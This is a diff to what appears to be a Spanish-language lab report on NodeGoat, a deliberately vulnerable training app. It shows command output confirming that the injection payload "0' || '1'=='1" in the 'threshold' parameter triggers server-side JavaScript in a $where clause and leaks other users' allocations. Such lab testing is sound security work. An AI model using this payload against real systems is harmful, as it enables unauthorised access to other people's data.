@@ -10,17 +10,16 @@ Comando:
 Salida:
   [V2] Destino: http://localhost:4000  userId=1
   [V2] Payload threshold: "0' || '1'=='1"
-  [V2] Linea base (threshold=-1): 1 fila(s) -> ['Node Goat Admin']
-  [V2] Con inyeccion:             3 fila(s) -> ['John Doe', 'Node Goat Admin', 'Will Smith']
+  [V2] Linea base (threshold=0): 1 fila(s) -> ['Node Goat Admin']
+  [V2] Con inyeccion:            3 fila(s) -> ['John Doe', 'Node Goat Admin', 'Will Smith']
   [V2] Datos expuestos de otros usuarios: ['John Doe', 'Will Smith']
   [V2] RESULTADO: VULNERABLE - el $where ejecuto la entrada (A05:2025)
-  EXIT=1
+  EXIT_ANTES=1
 
 Interpretacion:
-  Con una peticion normal (threshold=-1) el endpoint /allocations/1 devuelve
-  solo la asignacion del propio usuario (admin). Al enviar en 'threshold' la
-  condicion booleana siempre verdadera 0' || '1'=='1, la clausula $where la
-  ejecuta como JavaScript y el filtro devuelve las asignaciones de los 3
-  usuarios del seed (admin, user1=John Doe, user2=Will Smith). Se confirma la
-  inyeccion NoSQL / ejecucion de JS del lado servidor y la fuga de datos de
-  otros usuarios.
+  Con una peticion normal (threshold=0) el endpoint /allocations/1 devuelve solo
+  la asignacion del propio usuario (admin). Al enviar en 'threshold' la condicion
+  booleana siempre verdadera 0' || '1'=='1, la clausula $where la ejecuta como
+  JavaScript y el filtro devuelve las asignaciones de los 3 usuarios del seed
+  (admin, user1=John Doe, user2=Will Smith). Se confirma la inyeccion NoSQL /
+  ejecucion de JS del lado servidor y la fuga de datos de otros usuarios.
